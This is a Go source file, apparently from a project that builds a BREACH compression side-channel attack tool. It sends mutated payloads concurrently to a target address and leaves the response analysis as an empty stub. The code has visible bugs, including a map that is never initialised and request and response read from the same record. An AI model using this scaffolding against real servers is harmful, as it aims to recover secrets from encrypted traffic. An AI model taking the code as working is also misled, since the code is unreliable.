package cryptopener

import (
	client "github.com/larikuistio/cryptopener/client"
	"sync"
	"time"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken []string
}

type ReqRespStruct struct {
	// request
	req []byte
	// response
	resp []byte
}

var rmap map[uint64]ReqRespStruct
var rctr uint64
var actr uint64
var mut sync.Mutex
var mut2 sync.Mutex

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.Client{
			Addr: address,
			Entrypoint: entry,
		},
		mutator: NewMutator(),
	}
	return &cryptopener
}

func (p *Cryptopener) sendPayload(payload []byte, client *client.Client) {
	response := client.SendMessageConcurrent(string(payload))
	var newstruct ReqRespStruct
	newstruct.req = payload
	newstruct.resp = response
	mut.Lock()
	rmap[rctr] = newstruct
	rctr = rctr + 1
	mut.Unlock()
	return
}

func (p *Cryptopener) analyseResponse() {
	var prev_actr uint64
	for {
		mut2.Lock()
		if actr < rctr {
			prev_actr = actr
			actr = actr + 1
			mut2.Unlock()
			break
		}
		mut2.Unlock()
		time.Sleep(5 * time.Millisecond)
	}
	mut.Lock()
	request := rmap[prev_actr]
	response := rmap[prev_actr]
	mut.Unlock()
	// code for analyzing response here
	_ = response
	_ = request
	return
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	rctr = 0
	actr = 0
	client := client.NewClient("127.0.0.1:8080", "/")
	for {
		// create new payload
		payload, _ := p.mutator.NewPayload(false)

		// send payload into a socket
		go p.sendPayload(payload, client)
		go p.analyseResponse()
	}
}
